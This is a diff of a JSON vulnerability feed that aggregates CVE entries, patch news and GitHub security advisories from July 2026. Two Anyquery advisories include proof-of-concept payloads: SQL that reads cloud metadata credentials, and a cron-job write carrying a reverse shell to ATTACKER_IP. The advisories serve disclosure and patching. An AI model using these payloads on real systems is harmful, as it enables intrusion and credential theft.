@@ -1,48 +1,10 @@
 {
-  "generated": "2026-07-14T18:59:20.458285+00:00",
-  "total": 32,
-  "kev": 2,
-  "zero_day": 19,
+  "generated": "2026-07-15T01:12:53.627683+00:00",
+  "total": 38,
+  "kev": 0,
+  "zero_day": 21,
   "enriched": 0,
   "findings": [
-    {
-      "id": "CVE-2026-56164",
-      "title": "CVE-2026-56164 \u2014 Microsoft SharePoint Server Missing Authentication for Critical Function Vulnerability",
-      "summary": "Vendor: Microsoft | Product: SharePoint Server. Microsoft SharePoint contains a missing authentication for critical function vulnerability that allows an unauthorized attacker to elevate privileges over a network. Required action: Apply mitigations in accordance with vendor instructions, ensuring compliance with CISA\u2019s BOD 26-04 Prioritizing Security Updates Based on Risk (see URL in Notes) guidance and CISA\u2019s \u201cForensics Triage Requirements\u201d (see URL in Notes). Follow applicable BOD 26-04 guidance for cloud services or discontinue use of the product if mitigations are unavailable. Stakeholders are responsible for evaluating each asset's internet exposure and ensuring adherence to BOD 26-04 patching guidelines. (due 2026-07-17)",
-      "link": "https://nvd.nist.gov/vuln/detail/CVE-2026-56164",
-      "published": "2026-07-14",
-      "source": "CISA KEV",
-      "tags": [
-        "cisa",
-        "kev",
-        "actively-exploited"
-      ],
-      "cve_ids": [
-        "CVE-2026-56164"
-      ],
-      "is_kev": true,
-      "is_zero_day": true,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-56155",
-      "title": "CVE-2026-56155 \u2014 Microsoft Active Directory Federation Services Insufficient Granularity of Access Control Vulnerability ",
-      "summary": "Vendor: Microsoft | Product: Active Directory Federation Services. Microsoft Active Directory Federation Services contains an insufficient granularity of access control vulnerability that allows an authorized attacker to elevate privileges locally. Required action: Apply mitigations in accordance with vendor instructions, ensuring compliance with CISA\u2019s BOD 26-04 Prioritizing Security Updates Based on Risk (see URL in Notes) guidance and CISA\u2019s \u201cForensics Triage Requirements\u201d (see URL in Notes). Follow applicable BOD 26-04 guidance for cloud services or discontinue use of the product if mitigations are unavailable. Stakeholders are responsible for evaluating each asset's internet exposure and ensuring adherence to BOD 26-04 patching guidelines. (due 2026-07-28)",
-      "link": "https://nvd.nist.gov/vuln/detail/CVE-2026-56155",
-      "published": "2026-07-14",
-      "source": "CISA KEV",
-      "tags": [
-        "cisa",
-        "kev",
-        "actively-exploited"
-      ],
-      "cve_ids": [
-        "CVE-2026-56155"
-      ],
-      "is_kev": true,
-      "is_zero_day": true,
-      "is_high_severity": false
-    },
     {
       "id": "https://www.cisa.gov/news-events/cybersecurity-advisories/aa26-194a",
       "title": "Improve Router Hygiene to Protect Against Russian State-Sponsored Targeting",
@@ -72,6 +34,56 @@
       "cve_ids": [
         "CVE-2024-57727"
       ],
+      "is_zero_day": true,
+      "is_high_severity": true
+    },
+    {
+      "id": "https://www.rapid7.com/blog/post/em-patch-tuesday-july-2026",
+      "title": "Patch Tuesday - July 2026",
+      "summary": "Microsoft is publishing 622 vulnerabilities on July 2026 Patch Tuesday , including a record-breaking 416 Windows vulnerabilities. Microsoft is aware of exploitation in the wild for two of the vulnerabilities published today, both of which are listed on CISA KEV, as well as public disclosure for one other. As usual, browser vulns are not included in the Patch Tuesday count above. Rapid7 noted last month that Microsoft no longer enumerates Chromium CVEs in the Security Update Guide. However, Microsoft has now taken the pursuit of minimalism much further, since today\u2019s Security Update Guide no longer lists out even Microsoft vulnerabilities! Instead, we now receive a summary table of vulnerability counts by product family, as well as a new slimline \u201cNotable CVEs\u201d section. All of this only serves to illustrate the recent industry-wide trend of exploding vulnerability report counts, with an associated uptick in the publication of remediations as a trailing indicator. SharePoint: critical auth bypass by Rapid7 Today sees the publication of CVE-2026-55040 , a critical authentication bypass in Microsoft SharePoint. Discovered by Rapid7 Senior Principal Security Researcher Stephen Fewer , and published today in coordination with Microsoft, this vulnerability is the first in a pair of exploits which, when chained together, can lead to unauthenticated remote code execution against a vulnerable SharePoint server. Patches are available for SharePoint Server Subscription Edition, 2019, and 2016. As the full Rapid7 blog post sets out, the second vulnerability in the full RCE chain remains embargoed for now, with Microsoft expected to publish patches for that second vulnerability as part of Patch Tuesday August 2026. Microsoft noted: \u201cWe would like to thank Rapid7 for responsibly reporting this issue through coordinated vulnerability disclosure.\u201d SharePoint: zero-day EoP It\u2019s a rare Patch Tuesday which doesn\u2019t include multiple SharePoint fixes, and today is no exception. Microsoft ",
+      "link": "https://www.rapid7.com/blog/post/em-patch-tuesday-july-2026",
+      "published": "2026-07-14T22:00:26+00:00",
+      "source": "Rapid7 Blog",
+      "tags": [
+        "research",
+        "metasploit"
+      ],
+      "cve_ids": [
+        "CVE-2026-55040"
+      ],
+      "is_zero_day": true,
+      "is_high_severity": true
+    },
+    {
+      "id": "https://www.bleepingcomputer.com/news/security/sonicwall-warns-of-sma1000-flaws-exploited-in-zero-day-attacks-patch-now/",
+      "title": "SonicWall warns of SMA1000 flaws exploited in zero-day attacks, patch now",
+      "summary": "SonicWall warns that threat actors have been exploiting two SMA1000 vulnerabilities, tracked as\u00a0CVE-2026-15409 and CVE-2026-15410, in zero-day attacks and urges customers to install the newly released security updates. [...]",
+      "link": "https://www.bleepingcomputer.com/news/security/sonicwall-warns-of-sma1000-flaws-exploited-in-zero-day-attacks-patch-now/",
+      "published": "2026-07-14T21:23:24+00:00",
+      "source": "Bleeping Computer",
+      "tags": [
+        "news",
+        "malware"
+      ],
+      "cve_ids": [
+        "CVE-2026-15409",
+        "CVE-2026-15410"
+      ],
+      "is_zero_day": true,
+      "is_high_severity": true
+    },
+    {
+      "id": "https://thehackernews.com/2026/07/microsoft-patches-record-622-flaws.html",
+      "title": "Microsoft Patches Record 622 Flaws, Including Two Zero-Days Under Active Attack",
+      "summary": "Microsoft shipped its largest Patch Tuesday on record today, and two of the fixes close holes that attackers are already exploiting. The release covers 622 of Microsoft's own CVEs by its\u00a0Security Update Guide\u00a0count, more than triple\u00a0June's previous high of around 200.\n\nThose two live bugs are the ones to grab first. Microsoft credits incident responders for both. Both are",
+      "link": "https://thehackernews.com/2026/07/microsoft-patches-record-622-flaws.html",
+      "published": "2026-07-14T20:25:47+00:00",
+      "source": "The Hacker News Security",
+      "tags": [
+        "news",
+        "zeroday"
+      ],
+      "cve_ids": [],
       "is_zero_day": true,
       "is_high_severity": true
     },
@@ -136,23 +148,6 @@
         "research"
       ],
       "cve_ids": [],
-      "is_zero_day": true,
-      "is_high_severity": true
-    },
-    {
-      "id": "https://www.rapid7.com/blog/post/ve-cve-2026-55040-microsoft-sharepoint-jwt-token-authentication-bypass-fixed",
-      "title": "CVE-2026-55040: Microsoft SharePoint JWT Token Authentication Bypass (FIXED)",
-      "summary": "Overview Rapid7 Labs conducted a zero-day research project against Microsoft SharePoint, resulting in the discovery of two new vulnerabilities that, when chained together, achieve unauthenticated remote code execution (RCE) against a vulnerable SharePoint server. Today, both Rapid7 and Microsoft are disclosing the first vulnerability in this chain, the authentication bypass vulnerability CVE-2026-55040. The RCE component of the exploit chain is expected to be patched by Microsoft in the next update cycle for August 2026. The exploit chain was developed as an entry for the recent Pwn2Own Berlin hacking competition \u2013 part of Rapid7 Labs' continued effort to raise the bar in Vulnerability Intelligence and our commitment to the preemptive protection of our customers through original vulnerability research. A remote unauthenticated attacker can leverage CVE-2026-55040 to bypass authentication on a vulnerable SharePoint server and perform operations as a SharePoint site user or administrator. The vulnerability is due to several issues in the JWT token validation pipeline. CVE-2026-55040 has a CVSSv3.1 score of 9.1 (Critical) , and a Common Weakness Enumeration (CWE) of CWE-1390: Weak Authentication . Product description Microsoft SharePoint is a ubiquitous, web-based collaboration and document management platform deeply integrated into the Microsoft 365 ecosystem. Serving as the central hub for corporate intranets, internal file sharing, and workflow automation, it is trusted by enterprises worldwide to store and manage vast repositories of sensitive business data. Because SharePoint acts as a critical bridge between internal users, active directories, and cloud infrastructure, vulnerabilities within its architecture present a high-risk attack surface. Impact By leveraging CVE-2026-55040, a remote unauthenticated attacker can assume the identity of any SharePoint site user; the prerequisite is the attacker must know in advance the user they wish to identify as. This can b",
-      "link": "https://www.rapid7.com/blog/post/ve-cve-2026-55040-microsoft-sharepoint-jwt-token-authentication-bypass-fixed",
-      "published": "2026-07-14T13:00:00+00:00",
-      "source": "Rapid7 Blog",
-      "tags": [
-        "research",
-        "metasploit"
-      ],
-      "cve_ids": [
-        "CVE-2026-55040"
-      ],
       "is_zero_day": true,
       "is_high_severity": true
     },
@@ -345,6 +340,150 @@
       "is_high_severity": false
     },
     {
+      "id": "CVE-2026-61549",
+      "title": "Woodpecker: Privilege escalation via unrestricted serviceAccountName in the Kubernetes backend",
+      "summary": "### Impact\n\nA privilege escalation vulnerability affects Woodpecker instances using the **Kubernetes backend**.\n\nThe pipeline option `backend_options.kubernetes.serviceAccountName` was passed directly to the pod spec without any admin gating.\n\n**Who is impacted:** any operator running the Kubernetes backend. Any user with **Push** permission on a connected repository can run pipeline pods under an arbitrary ServiceAccount in the pipeline namespace, gaining that account's RBAC permissions. If a privileged ServiceAccount is reachable in that namespace, this can lead to secret exfiltration (database credentials, API keys, TLS certs) and full cluster takeover.\n\n### Patches\n\nhttps://github.com/woodpecker-ci/woodpecker/pull/6792\n\n### Workarounds\n\nOperators who cannot upgrade immediately can mitigate by any of:\n\n- **Restrict Push access** on repositories connected to the Kubernetes-backed instance to\n  trusted users only.\n- **Harden the pipeline namespace**: ensure no privileged ServiceAccount exists or is bound in\n  the namespace where pipeline pods run; keep the `default` ServiceAccount minimally privileged.\n- **Disable ServiceAccount token automounting** for ServiceAccounts that should not be used by\n  pipelines.\n- **Enforce an admission policy** (e.g. OPA/Gatekeeper, Kyverno, or a ValidatingAdmissionPolicy)\n  that rejects pipeline pods setting an unexpected `serviceAccountName`.\n- **Use a dedicated, isolated namespace** per org/instance with no sensitive RBAC bindings.\n\n### Resources\n\n- Vulnerable option introduced in commit `609ba481b5e912f59aaae8ca7bc22b44523c5e37`\n- Affected versions: `v1.0.0` through `v3.15.0`\n- Source: `pipeline/backend/kubernetes/backend_options.go` (field `ServiceAccountName`),\n  `pipeline/backend/kubernetes/pod.go` (assigned to pod spec with no gating)",
+      "link": "https://github.com/advisories/GHSA-qf34-295c-26v8",
+      "published": "2026-07-14T20:29:32Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-61549"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-53604",
+      "title": "nebula-mesh: CA private key not zeroized on web mobile-bundle error paths",
+      "summary": "## Impact\n\nThe web handler `renderMobileBundle` (`internal/web/handlers.go:1325`) passes the real `*pki.CAResolver` directly into `mobilebundle.Build`. Inside `Build` (`internal/mobilebundle/builder.go:54`), `resolver.LoadByID` decrypts the CA's ed25519 private key into a `*pki.CAManager`, but `Build` never calls `CAManager.Wipe()` on any return path (success or any of the error paths at lines 56, 62, 68, 80, 86, 92, 98, 102, 109, 118, 150).\n\nAs a result, when a mobile-bundle request goes through the **web** UI and `Build` returns \u2014 especially on error (missing network, invalid prefix, DB error, signing failure) \u2014 the plaintext CA private key remains on the Go heap, unwiped, until garbage collection. An attacker able to read process memory (core dump, swap, memory-scraping) can recover the CA signing key, which would allow minting arbitrary host certificates for the mesh.\n\nThe **API** handler (`internal/api/mobile_bundle.go:74`) already does this correctly: it loads the `CAManager`, `defer caMgr.Wipe()`, and wraps it in `caManagerResolver`. Only the web path is affected.\n\nThis is the same key-zeroization class previously addressed in GHSA-8h84-fhqq-q58v.\n\n## Patches\n\nAdd `defer caMgr.Wipe()` inside `mobilebundle.Build` immediately after the `LoadByID` call so every caller (web and API) is protected on all return paths. Ensure `CAManager.Wipe()` is idempotent, since the API handler also wipes the same manager.\n\n## Workarounds\n\nNone at the configuration level; requires a code fix.\n\n## Resources\n\n- `internal/web/handlers.go:1325`\n- `internal/mobilebundle/builder.go:54`\n- `internal/api/mobile_bundle.go:74` (correct reference implementation)\n- Prior related advisory: GHSA-8h84-fhqq-q58v",
+      "link": "https://github.com/advisories/GHSA-2p2f-px33-4vv5",
+      "published": "2026-07-14T20:05:38Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-53604"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-54628",
+      "title": "Anyquery: Server-Side Request Forgery (SSRF) via Unrestricted SQLite Virtual Table Modules in Server Mode",
+      "summary": "## Summary\nAnyquery's `server` mode does not restrict outbound HTTP requests initiated by its built-in SQLite virtual table modules (e.g., `json_reader`, `log_reader`). Unauthenticated attackers connecting to the MySQL-compatible server port can create virtual tables pointing to internal network endpoints or Cloud Metadata IPs (e.g., `http://169.254.169.254/latest/meta-data/`). This allows attackers to perform Server-Side Request Forgery (SSRF), bypassing external firewalls to scan internal ports and exfiltrate cloud credentials.\n\n## Details\nWhen Anyquery is launched in **Server Mode** (`anyquery server`), it binds to a TCP port and accepts MySQL protocol connections. The server handler allows the creation of dynamic virtual tables using modules like `json_reader` or `log_reader`, which internally use `go-getter` to fetch URLs. There is no protection mechanism to prevent fetches to local (127.0.0.0/8), private (10.0.0.0/8), or special (169.254.169.254) IP addresses. \n\nAn attacker can use this to map internal networks, interact with internal APIs, or steal IAM tokens from cloud metadata servers by fetching the data and reading it as a database table.\n\n## PoC (Proof of Concept)\n1. Start the server on the victim machine (e.g., an AWS EC2 instance):\n   ```bash\n   anyquery server --host 0.0.0.0 --port 8070\n   ```\n2. Connect from an attacker machine:\n   ```bash\n   mysql -u root -h <VICTIM_IP> -P 8070\n   ```\n3. Execute the payload to fetch AWS Metadata or hit a local API:\n   ```sql\n   -- Payload 1: Fetch AWS Cloud Metadata (IAM credentials)\n   CREATE VIRTUAL TABLE aws_meta USING log_reader('http://169.254.169.254/latest/meta-data/');\n   SELECT * FROM aws_meta;\n\n   -- Payload 2: Access an internal application bound only to localhost\n   CREATE VIRTUAL TABLE local_admin USING log_reader('http://localhost:8000/admin');\n   SELECT * FROM local_admin LIMIT 10;\n   ```\n\n## Impact\n- **Confidentiality:** High. Exfiltration of sensitive internal network data or cloud credentials.\n- **",
+      "link": "https://github.com/advisories/GHSA-hwrq-8wxh-q4xv",
+      "published": "2026-07-14T20:02:06Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-54628"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-54448",
+      "title": "Trivy: Helm chart tar bomb causes OOM via unbounded io.ReadAll in parser",
+      "summary": "## Summary\n\nWhen Trivy scans a Helm chart archive (`.tgz`), its custom tar unpacker reads each entry with `io.ReadAll(tr)` and no size limit. An attacker who can place a malicious `.tgz` file in the scanned path can craft a small compressed archive that decompresses to gigabytes, causing the Trivy process to be killed by the OS OOM killer.\n\n## Affected configurations\n\nExploitation requires the attacker to place a crafted `.tgz` file in a location that Trivy will scan as a Helm chart. This applies to the following scan targets:\n\n| Command | Condition |\n| --- | --- |\n| `trivy config <dir>` | Directory contains a crafted `.tgz` Helm chart (misconfiguration scanning is always enabled) |\n| `trivy filesystem --scanners misconf <dir>` | Directory contains a crafted `.tgz` Helm chart **and** `--scanners misconf` is explicitly enabled |\n| `trivy image --scanners misconf <image>` | Image contains a crafted `.tgz` Helm chart **and** `--scanners misconf` is explicitly enabled |\n\nRealistic scenarios include:\n- A CI pipeline that runs `trivy config .` on a repository where a contributor can submit a pull request containing a crafted chart archive.\n- A pipeline that scans a container image with `--scanners misconf`, whose build context includes untrusted `.tgz` files.\n\n## Impact\n\nAn attacker who satisfies the conditions above can exhaust all available memory on the host running Trivy. The OS OOM killer will terminate the Trivy process and may affect other processes sharing the same host or CI runner.\n\nThe practical impact in CI environments is denial of service: the scan fails, the pipeline is blocked, and repeated submissions re-trigger the same condition. Cloud CI runners may also incur additional costs for consumed resources.\n\nThere is no impact on confidentiality or integrity of the scanned system.\n\n## Patches\n\nFixed in Trivy `v0.71.0` (#10718). The custom tar unpacker was replaced with `archive.LoadArchiveFiles` from the official `helm.sh/helm/v4` SDK, which enforces per-entr",
+      "link": "https://github.com/advisories/GHSA-q3fv-x8vg-qqm4",
+      "published": "2026-07-14T19:52:14Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-54448"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-54087",
+      "title": "EasyAdmin: Stored Cross-Site Scripting (XSS) via uploaded files served inline in FileField and ImageField",
+      "summary": "EasyAdmin's `FileField` and `ImageField` accept browser-executable file types by default (`FileField` applies no MIME/extension restrictions; `ImageField`'s default `Image` constraint accepts SVG). When the upload directory is configured inside the public web root \u2014 as shown in the documentation \u2014 EasyAdmin links to the stored file inline (no download attribute or `Content-Disposition: attachment`).\n\nAn attacker with access to a form using these fields can upload an `.html` (`FileField`) or `.svg` (`ImageField`) file containing JavaScript. When another  user opens it from the backend, it is served from the same origin and the script executes in the context of their authenticated admin session, enabling session/CSRF-token theft or privilege escalation.\n\nExploitation requires the developer to store uploads in the public directory and a privilege gap between the uploading user and the viewing administrator. This is stored XSS only \u2014 it does not allow remote code execution, because uploaded filenames are derived from Symfony's `guessExtension()`, which never produces `.php`/`.phtml`.\n\nCredit\n\nWe would like to thank Emre Dogan for reporting the issue.",
+      "link": "https://github.com/advisories/GHSA-8559-gwj3-q37r",
+      "published": "2026-07-14T19:51:34Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-54087"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-50158",
+      "title": "yutu: Arbitrary File Write via MCP `caption-download` Tool",
+      "summary": "## Arbitrary File Write via MCP `caption-download` Tool\n\n### Summary\n\nThe `caption-download` MCP tool in yutu passes the caller-supplied `file` parameter directly to `os.Create()` at `pkg/caption/caption.go:272` without any path validation, canonicalization, or confinement to the `pkg.Root` boundary (`YUTU_ROOT`). A local attacker \u2014 or any process able to reach the HTTP MCP server \u2014 can write arbitrary content to any path writable by the yutu process, entirely outside the intended working directory. This is a **High** severity vulnerability (CVSS 7.7) with high integrity and availability impact.\n\n### Details\n\nyutu uses `pkg.Root` (backed by Go 1.24's `os.OpenRoot`) to restrict all file I/O to the `YUTU_ROOT` directory. Every other caption file-write path honours this boundary:\n\n| Method | Sink | Confined? |\n|--------|------|-----------|\n| `Caption.Insert()` | `pkg.Root.Open(c.File)` (`caption.go:109`) | Yes |\n| `Caption.Update()` | `pkg.Root.Open(c.File)` (`caption.go:193`) | Yes |\n| `Caption.Download()` | `os.Create(c.File)` (`caption.go:272`) | **No** |\n\n`Caption.Download()` is the sole outlier. The attacker-controlled `file` field flows without restriction from the MCP tool input schema to a raw `os.Create()` call:\n\n1. **Source** \u2014 `cmd/caption/download.go:32\u201341`: `downloadInSchema` declares `file` as a required `string` field in the MCP JSON input schema.\n2. **Binding** \u2014 `cmd/caption/download.go:61\u201364`: `cobramcp.GenToolHandler` maps MCP input to `input.Download(writer)`.\n3. **Sink** \u2014 `pkg/caption/caption.go:272`: `os.Create(c.File)` creates or truncates the file at the attacker-supplied path.\n4. **Write** \u2014 `pkg/caption/caption.go:280`: `file.Write(body)` writes the downloaded caption bytes to that path.\n\n```go\n// cmd/caption/download.go\nvar downloadInSchema = &jsonschema.Schema{\n    Required: []string{\"ids\", \"file\"},          // line 34\n    // ...\n    \"file\": {Type: \"string\", Description: fileUsage},  // line 40\n}\n\n// cobramcp.GenToolHandler binds MCP \u2192 hand",
+      "link": "https://github.com/advisories/GHSA-2c7f-fxww-6w6c",
+      "published": "2026-07-14T19:34:47Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-50158"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-54052",
+      "title": "n8n-MCP: Cross-tenant access to workflow version backups in multi-tenant HTTP deployments",
+      "summary": "## Impact\n\nIn multi-tenant HTTP deployments \u2014 where a single n8n-mcp server serves several tenants \u2014 the locally stored workflow version history (the automatic backups taken before workflow updates) was not isolated per tenant. An authenticated tenant could read workflow version snapshots belonging to other tenants, and could delete or destroy other tenants' stored backups.\n\nA stored snapshot includes full node definitions, so the exposed data can contain credential references and authorization headers configured on nodes. This is therefore a confidentiality issue in addition to an integrity/availability one.\n\n## Affected configurations\n\n- HTTP mode with multi-tenancy enabled (`ENABLE_MULTI_TENANT=true`), where multiple tenants are served by a single shared instance and database.\n\nNot affected:\n\n- stdio / single-user deployments (e.g. Claude Desktop).\n- Single-tenant HTTP deployments (one tenant per instance and database).\n\n## Affected versions\n\n`<= 2.56.0`\n\n## Patched version\n\n`2.56.1`. The stored version history is now isolated per instance, so a tenant can only access its own backups. Upgrading runs a one-time migration that isolates existing history and clears previously stored, un-scoped backups (these are auto-created, short-retention backups).\n\n## Workarounds\n\nIf users cannot upgrade immediately:\n\n- Disable the workflow version tool by setting `DISABLED_TOOLS=n8n_workflow_versions` in the server environment (for example, in your Docker `.env`). This removes the affected tool from the deployment for all tenants; automatic backups are unaffected, but the cross-tenant access path is closed.\n- Alternatively, do not run in multi-tenant mode \u2014 serve each tenant from a separate instance with its own database, so no local store is shared between tenants.\n- Restrict network access to the HTTP endpoint to trusted operators.\n\nstdio and single-tenant HTTP deployments are not affected.\n\n## Credit\n\nReported by Francisco Rosales (@0xmagic0) and coordinated by Ax Sharma (@ax",
+      "link": "https://github.com/advisories/GHSA-j6r7-6fhx-77wx",
+      "published": "2026-07-14T19:07:14Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-54052"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-50141",
+      "title": "Woodpecker gRPC agent_id metadata can be spoofed- cross-tenant agent impersonation",
+      "summary": "### Impact\nA vulnerability in Woodpecker CI's gRPC layer allowed any authenticated agent to impersonate any other agent on the same server by injecting a forged `agent_id` value into outgoing gRPC metadata. The server correctly verified the JWT token but then discarded the verified agent identity in favor of the client-supplied value.\n\n### Patches\nDirect patch: https://github.com/woodpecker-ci/woodpecker/pull/6567\nLater proper fix: https://github.com/woodpecker-ci/woodpecker/pull/6569\n\n### Workarounds\nDisable org agents (`WOODPECKER_DISABLE_USER_AGENT_REGISTRATION=true`) and delete existing ones\n\n### Resources\nPublic ref: https://github.com/woodpecker-ci/woodpecker/issues/6541\nPrivate com: https://github.com/woodpecker-ci/woodpecker-security/issues/21",
+      "link": "https://github.com/advisories/GHSA-g7mm-9vx7-jm7h",
+      "published": "2026-07-14T19:00:29Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-50141"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
       "id": "CVE-2026-50006",
       "title": "Anyquery: Arbitrary File Write (AFW) which could lead to Remote Code Execution (RCE) via Unrestricted ATTACH DATABASE in Server Mode",
       "summary": "## Summary\nAnyquery's `server` mode does not disable or restrict native SQLite disk manipulation commands. Unauthenticated attackers connecting to the MySQL-compatible server port can use the `ATTACH DATABASE` command to write arbitrary SQLite databases to any path on the victim's filesystem where the process has write permissions. This leads to Arbitrary File Write (AFW) which could lead to Remote Code Execution (RCE) depending on the environment (e.g., by dropping a PHP web shell if a web server is running, or overwriting system cronjobs if running as root).\n\n## Details\nWhen Anyquery is launched in **Server Mode** (`anyquery server`), it blindly proxies incoming SQL commands to the underlying SQLite engine. SQLite allows dynamic database mounting via the `ATTACH DATABASE` command, which creates a physical `.db` file on the filesystem if the file does not exist.\n\nAn attacker can connect to the open Anyquery port, attach a new database to a sensitive path (e.g., `/var/www/html/shell.php`, `/etc/cron.d/pwn` or `/root/.ssh/authorized_keys`), create a table, and insert a malicious payload. Although the file will contain a binary SQLite header, standard Linux services like `cron`, `sshd`, and web servers like `PHP` tolerate garbage data and will parse/execute the valid payload lines injected by the attacker.\n\n## PoC (Proof of Concept)\n1. Start the server on the victim machine:\n   ```bash\n   anyquery server --host 0.0.0.0 --port 8070\n   ```\n2. Connect from an attacker machine:\n   ```bash\n   mysql -u root -h <VICTIM_IP> -P 8070\n   ```\n3. Execute the payload to write a malicious cronjob for native RCE (Note: the Anyquery process must have write permissions to the target directory, such as `/etc/cron.d` or `/var/spool/cron/crontabs/`):\n   ```sql\n   ATTACH DATABASE '/etc/cron.d/pwn' AS pwn;\n   CREATE TABLE pwn.task (cmd TEXT);\n   INSERT INTO pwn.task VALUES ('* * * * * root /bin/bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/1337 0>&1\"');\n   ```\n\n   *Alternatively, if a web server",
@@ -358,6 +497,23 @@
       ],
       "cve_ids": [
         "CVE-2026-50006"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "https://thehackernews.com/2026/07/sap-patches-cvss-99-netweaver-abap-flaw.html",
+      "title": "SAP Patches CVSS 9.9 NetWeaver ABAP Flaw That Could Expose or Modify Data",
+      "summary": "SAP has rolled out updates to address multiple vulnerabilities as part of its July 2026 security updates, including a critical flaw in SAP NetWeaver Application Server ABAP.\n\nThe vulnerability in question is CVE-2026-44747 (CVSS score: 9.9), an out-of-bounds write flaw that allows an authenticated attacker to leverage logical errors in memory management to cause a memory corruption that could",
+      "link": "https://thehackernews.com/2026/07/sap-patches-cvss-99-netweaver-abap-flaw.html",
+      "published": "2026-07-14T18:17:57+00:00",
+      "source": "The Hacker News Security",
+      "tags": [
+        "news",
+        "zeroday"
+      ],
+      "cve_ids": [
+        "CVE-2026-44747"
       ],
       "is_zero_day": false,
       "is_high_severity": true
@@ -466,60 +622,6 @@
       ],
       "cve_ids": [
         "CVE-2026-44300"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-52828",
-      "title": "Kimai: ExportTemplate CRUD Missing Authorization Check Allows Unauthorized TEAMLEAD Access",
-      "summary": "### Summary\n\nThe `ExportController` web routes for creating and editing export templates are gated only by the class-level `create_export` permission, which is granted to `ROLE_TEAMLEAD` by default. The corresponding API routes and UI button visibility correctly require the stricter `create_export_template` permission, which is granted only to `ROLE_ADMIN` and `ROLE_SUPER_ADMIN`. A TEAMLEAD user can directly access the template create/edit routes to create or modify global export templates that are visible to all users including administrators.\n\n### Details\n\nThe `ExportController` applies the class-level annotation `#[IsGranted('create_export')]`.\n\nThe `createExportTemplate` (line 210) and `editExportTemplate` (line 220) methods have no method-level `#[IsGranted('create_export_template')]` annotation. The permission hierarchy in `config/packages/kimai.yaml:103,115,122-123` grants `create_export` to `ROLE_TEAMLEAD` via the `EXPORT` permission set, but `create_export_template` only to `ROLE_ADMIN` and `ROLE_SUPER_ADMIN`.\n\nThe API controller correctly requires `create_export_template`. The UI template (`templates/export/index.html.twig:124`) correctly hides the create button behind `create_export_template`. Only the web controller routes are missing the check.\n\n`ExportTemplate` entities are global \u2014 they have no per-user or per-team scoping (`src/Entity/ExportTemplate.php:19-56`). Any template created or modified by a TEAMLEAD which is marked as \"Available for all users\" is visible to and usable by every user in the instance.\n\n*A PoC was provided, but removed for security reasons.*\n\n### Impact\n\nAny user with `ROLE_TEAMLEAD` can create and modify global export templates intended to be managed only by administrators. The templates control the structure and content of exported data (columns, renderer, format). While the impact is limited to data integrity manipulation of a non-security-critical resource (no RCE, no credential exposure), it violates the intended permission",
-      "link": "https://github.com/advisories/GHSA-rw46-qg69-vg6h",
-      "published": "2026-07-14T00:34:03Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-52828"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-52824",
-      "title": "Kimai: Default APP_SECRET in Docker Image Enables Cookie Forgery and Account Takeover",
-      "summary": "### Summary\n\nThe official Kimai Docker image ships with `APP_SECRET=change_this_to_something_unique` as the default environment variable. The Docker entrypoint does not override or validate this value. Any Kimai instance deployed using the Docker image without explicitly setting `APP_SECRET` runs with a publicly-known Symfony `kernel.secret`, enabling an unauthenticated attacker to forge HMAC-signed cookies and login links to take over any account including super_admin.\n\n### Details\n\n`Dockerfile:263` sets `ENV APP_SECRET=change_this_to_something_unique`. This value is consumed by `config/packages/framework.yaml:7` as `kernel.secret`, which Symfony uses to HMAC-sign:\n\n- The `KIMAI_REMEMBER` remember-me cookie\n- LoginLink signatures\n- Password reset URLs\n- CSRF tokens\n\nThe `.docker/entrypoint.sh` does not check for or replace the default sentinel value. The bare-metal `.env.dist:38` ships the same default. No startup-time guard exists anywhere in the codebase that refuses to start when `APP_SECRET` equals the sentinel.\n\nUser IDs are sequential integers starting from 1. The first super_admin account is almost always `id=1`. User IDs are visible in some URLs and API responses.\n\n*A PoC was provided, but removed for security reasons.*\n\n### Impact\n\nAny Kimai instance deployed via the official Docker image without overriding `APP_SECRET` can be compromised from the internet. An unauthenticated attacker who can reach the Kimai URL can forge authentication tokens and log in as any user if:\n- a username is known AND\n- the correct account ID for this username is guessed AND\n- the account has no active 2FA (two factor) authentication\n\n## Solution\n\n- The entrypoint.sh file is updated and now contains a script that generates a random `APP_SECRET` via `bin2hex(random_bytes(32))` which will be stored in  